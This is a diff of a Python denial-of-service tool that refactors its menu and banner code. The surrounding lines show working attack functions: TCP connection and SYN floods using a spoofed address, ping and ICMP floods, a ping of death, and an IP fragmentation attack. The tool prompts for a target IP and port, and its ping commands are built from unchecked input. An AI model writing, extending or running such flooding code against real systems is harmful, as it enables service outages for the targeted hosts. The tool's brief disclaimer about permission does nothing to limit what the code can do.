@@ -4,12 +4,12 @@ from sys import stdout
 from random import randint
 import os
 import socket
-import threading
 import time
 from scapy.all import *
-from concurrent.futures import thread
+
 fake_ip = '44.197.175.168'
 attack_num = 0
+
 def Attack(target, port):
 	while True:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -57,10 +57,12 @@ def SYN_Flood(dstIP,dstPort,counter):
 		total+=1
 
 	stdout.write("\nTotal packets sent: %i\n" % total)
+
 def Ping_flood():
     ip = str(input("Target IP: "))
     while(1):
         os.system("ping " + ip)
+
 def Pingofdeath():
     victimIP = str(input("Target IP: "))
     pingCommand = "ping " + victimIP + " -s 65467 -w 1 -n 1"
@@ -74,6 +76,7 @@ def Icmpflood():
 
     for x in range (0,int(cycle)):
         send(IP(dst=targetip)/ICMP())
+
 def IPfragmentation():
     dip=str(input("Target IP: "))
     payload="A"*496+"B"*500
@@ -91,17 +94,20 @@ def IPfragmentation():
         while(1):
             send(fragment)
 
+def banner():
+    os.system('cls' if os.name == 'nt' else 'clear')
+    print(r"  ______    ____       _____")
+    print(r" /_  __/   / __ \____ / ___/")
+    print(r"  / /_____/ / / / __ \\__ \ ")
+    print(r" / /_____/ /_/ / /_/ /__/ / ")
+    print(r"/_/     /_____/\____/____/  ")
+
 def main():
-    os.system("clear")
+    os.system('cls' if os.name == 'nt' else 'clear')
     print("Disclaimer: Illecit use of this tool could lead to a violation of federal and local laws.")
     print("Use this tool only on your own website or websites from which you have obtained permission.")
     time.sleep(5)
-    os.system("clear")
-    print("  ______    ____       _____")
-    print(" /_  __/   / __ \____ / ___/")
-    print("  / /_____/ / / / __ \\__ \ ")
-    print(" / /_____/ /_/ / /_/ /__/ / ")
-    print("/_/     /_____/\____/____/  ")
+    banner()
     print("Coded By: ParzivalHack")
     print("Github: https://github.com/ParzivalHack")
     print("      [Menu]      ")
@@ -115,74 +121,39 @@ def main():
     option = int(input("Choose an option: "))
     print(option)
     if option == 1:
-        os.system("clear")
+        os.system('cls' if os.name == 'nt' else 'clear')
         print("Disclaimer: On Termux this attack doesn't work (unless you are Root)")
         print("because of socket permissions.")   
         time.sleep(5)
-        os.system("clear")
-        print("  ______    ____       _____")
-        print(" /_  __/   / __ \____ / ___/")
-        print("  / /_____/ / / / __ \\__ \ ")
-        print(" / /_____/ /_/ / /_/ /__/ / ")
-        print("/_/     /_____/\____/____/  ")
+        banner()
         dstIP = str(input("Target IP: "))
         dstPort = int(input("Target Port (443 suggested): "))
         counter = int(input("Number of packets (5000 suggested): "))
         SYN_Flood(dstIP,dstPort,int(counter))
     elif option == 2:
-        os.system("clear")
-        print("  ______    ____       _____")
-        print(" /_  __/   / __ \____ / ___/")
-        print("  / /_____/ / / / __ \\__ \ ")
-        print(" / /_____/ /_/ / /_/ /__/ / ")
-        print("/_/     /_____/\____/____/  ")
+        banner()
         target = str(input("Target IP: "))
         port = int(input("Target Port (80 suggested): "))
         Attack(target, port) 
     elif option == 3:
-        os.system("clear")
-        print("  ______    ____       _____")
-        print(" /_  __/   / __ \____ / ___/")
-        print("  / /_____/ / / / __ \\__ \ ")
-        print(" / /_____/ /_/ / /_/ /__/ / ")
-        print("/_/     /_____/\____/____/  ")
+        banner()
         ip_addr = str(input("Target IP: "))
         pks = str(input("Number of packets: "))
         os.system("ping " + ip_addr + " -c " + pks)
     elif option == 4:
-        os.system("clear")
-        print("  ______    ____       _____")
-        print(" /_  __/   / __ \____ / ___/")
-        print("  / /_____/ / / / __ \\__ \ ")
-        print(" / /_____/ /_/ / /_/ /__/ / ")
-        print("/_/     /_____/\____/____/  ")
+        banner()
         Ping_flood()
     elif option == 5:
-        os.system("clear")
-        print("  ______    ____       _____")
-        print(" /_  __/   / __ \____ / ___/")
-        print("  / /_____/ / / / __ \\__ \ ")
-        print(" / /_____/ /_/ / /_/ /__/ / ")
-        print("/_/     /_____/\____/____/  ")
+        banner()
         Pingofdeath()
     elif option == 6:
         print("Disclaimer: On Termux this attack doesn't work (unless you are Root)")
         print("because of socket permissions.")   
         time.sleep(5)
-        os.system("clear")
-        print("  ______    ____       _____")
-        print(" /_  __/   / __ \____ / ___/")
-        print("  / /_____/ / / / __ \\__ \ ")
-        print(" / /_____/ /_/ / /_/ /__/ / ")
-        print("/_/     /_____/\____/____/  ")
+        banner()
         Icmpflood()
     elif option == 7:
-        os.system("clear")
-        print("  ______    ____       _____")
-        print(" /_  __/   / __ \____ / ___/")
-        print("  / /_____/ / / / __ \\__ \ ")
-        print(" / /_____/ /_/ / /_/ /__/ / ")
-        print("/_/     /_____/\____/____/  ")
+        banner()
         IPfragmentation()
 
 if __name__ == "__main__":
